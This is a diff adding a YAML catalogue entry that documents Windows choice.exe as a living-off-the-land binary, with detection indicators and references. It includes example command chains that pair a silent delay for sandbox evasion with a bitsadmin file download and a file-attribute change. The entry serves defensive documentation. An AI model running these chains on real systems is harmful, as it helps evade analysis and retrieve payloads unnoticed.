@@ -1,0 +1,42 @@
+Name: choice.exe
+Description: Built-in Windows utility used for user input in batch scripts. While not malicious on its own, it has been observed in real-world malware command chains to introduce execution delays and control flow prior to file manipulation or payload retrieval.
+Aliases:
+  - Alias: choice.com
+Author: Prakash Munimsingh Thakur
+Created: 2025-12-20
+Commands:
+  - Command: echo Waiting & choice /t 8 /d Y >nul & bitsadmin /transfer job https://example.com/test.txt C:\Temp\test.txt
+    Description: Introduces a silent execution delay before downloading a file using a trusted Windows binary.
+    Usecase: Used by attackers to evade sandbox analysis and delay payload retrieval.
+    Category: Defense Evasion
+    Privileges: User
+    MitreID: T1497
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Technique: Timing Evasion
+      - Behavior: Execution Flow Control
+
+  - Command: choice /t 10 /d Y >nul & attrib -h "C:\Users\Public\test.txt"
+    Description: Uses a silent delay before manipulating file attributes, similar to behavior observed in ransomware cleanup stages.
+    Usecase: Helps attackers hide or modify files after execution while delaying analysis.
+    Category: Defense Evasion
+    Privileges: User
+    MitreID: T1497
+    OperatingSystem: Windows 10, Windows 11
+
+Full_Path:
+  - Path: C:\Windows\System32\choice.exe
+
+Detection:
+  - IOC: choice.exe followed by file manipulation or network-enabled LOLBins
+  - IOC: Unusual execution delays in batch scripts
+  - Analysis: https://attack.mitre.org/techniques/T1497/
+
+Resources:
+  - Link: https://www.sentinelone.com/labs/wastedlocker-ransomware-abusing-ads-and-ntfs-file-attributes/
+  - Link: https://attack.mitre.org/techniques/T1497/
+  - Link: https://research.splunk.com/endpoint/d5f54b38-10bf-4b3a-b6fc-85949862ed50/
+
+Acknowledgement:
+  - Person: Prakash Munimsingh Thakur
+    Handle: 'https://github.com/4renSick/'
